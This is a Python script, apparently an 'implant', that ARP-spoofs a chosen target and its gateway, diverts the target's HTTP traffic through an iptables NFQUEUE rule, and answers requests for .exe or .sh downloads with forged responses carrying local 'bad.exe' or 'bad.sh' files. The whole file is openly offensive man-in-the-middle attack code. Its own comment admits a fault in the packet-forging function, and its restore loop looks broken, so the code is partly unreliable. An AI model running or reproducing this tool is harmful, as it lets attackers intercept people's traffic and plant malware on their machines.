#!/usr/bin/python

import os
import sys
import netifaces
from scapy.all import *
from netfilterqueue import NetfilterQueue
from threading import Thread
run = True
my_ip = "127.0.0.1"

def getmyip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]

def getmymac():
    return netifaces.ifaddresses('eth0')[netifaces.AF_LINK][0]['addr']

def getmac(mine, theirs):
    result = sr(ARP(op=ARP.who_has, psrc=mine, pdst=theirs))
    return result[0][ARP][0][1].hwsrc

def sendfile(filename, packet):
    data = open(filename,"r")
    raw = "HTTP/1.1 200 OK\r\n\r\n" + str(data.read())
    new_p = IP(dst=packet[IP].src, src=packet[IP].dst)/TCP(seq=(packet[TCP].ack + 1), ack=(packet[TCP].seq + 1))/raw
    new_p.show2()
    # something wrong happens here
    packet.set_payload(str(new_p))

    packet.accept()

# constant MITM ARP spoof
def spoofarp(t_ip, t_mac, r_ip, r_mac):
    while (run):
	targetpack = ARP(op=2, pdst=t_ip, psrc=r_ip, hwdst=t_mac)
	#targetpack.show2()
	send(targetpack, iface="eth0", verbose=False)

	routerpack = ARP(op=2, pdst=r_ip, psrc=t_ip, hwdst=r_mac)
	#routerpack.show2()
	send(routerpack, iface="eth0", verbose=False)

# restore ARP between the target and server
def rearp(t_ip, t_mac, r_ip, r_mac):
    while (run):
	targetpack = ARP(op=2, pdst=t_ip, psrc=r_ip, hwdst=t_mac, hwsrc=r_mac)
	#targetpack.show2()
	send(targetpack, iface="eth0", verbose=False)

	routerpack = ARP(op=2, pdst=r_ip, psrc=t_ip, hwdst=r_mac, hwsrc=t_mac)
	#routerpack.show2()
	send(routerpack, iface="eth0", verbose=False)

def callback(packet):
    try:
        global my_ip
        data = packet.get_payload()
	scapy_pkt = IP(data)
        p = scapy_pkt
        if TCP in p and Raw in p and "GET" in p[Raw].load and "HTTP" in p[Raw].load and p[TCP].flags == 24 and (".exe" in p[Raw].load or ".sh" in p[Raw].load):
            print "Wubba lubba dub dub!!! Gunna install a MALICIOUS FIIILE"
            print "Woooweeee! downloading my file :3"
            if ".exe" in p[Raw].load:
                sendfile("bad.exe", scapy_pkt)
            if ".sh" in p[Raw].load:
                sendfile("bad.sh", scapy_pkt)
        else:
            packet.accept()

    except Exception as e:
        print "Oh geez, something went wrong :/"
        print(e)

if len(sys.argv) != 3:
    print "Usage: ./implant <target ip address> <gateway>"
    sys.exit(1)

# initialize necessary variables
print "initializing variables ..."
try:
    my_ip = getmyip()
    my_mac = getmymac()
    t_ip = sys.argv[1]
    g_ip = sys.argv[2]
    t_mac = getmac(my_ip, t_ip)
    g_mac = getmac(my_ip, g_ip)
    print "variables initialized! :)"
except Exception as e:
    print "Oh geez, something went wrong :/\n"
    print(e)

print "performing ARP spoof ..."
Thread(target=spoofarp, args=(t_ip, t_mac, g_ip, g_mac)).start()
print "arp spoof set up successfully"

# start queue
print "making iptable rule ... "
os.system('iptables -A FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 1')

nfqueue = NetfilterQueue()
nfqueue.bind(1, callback)
print "rule made!"

try:
    nfqueue.run()
except KeyboardInterrupt:
    run = False
    print "exiting ... "
    rearp(t_ip, t_mac, g_ip, g_mac)
    print "reARPed target and router! :)"
    os.system('iptables -t nat -F')
    print "reset iptable rule! :)"
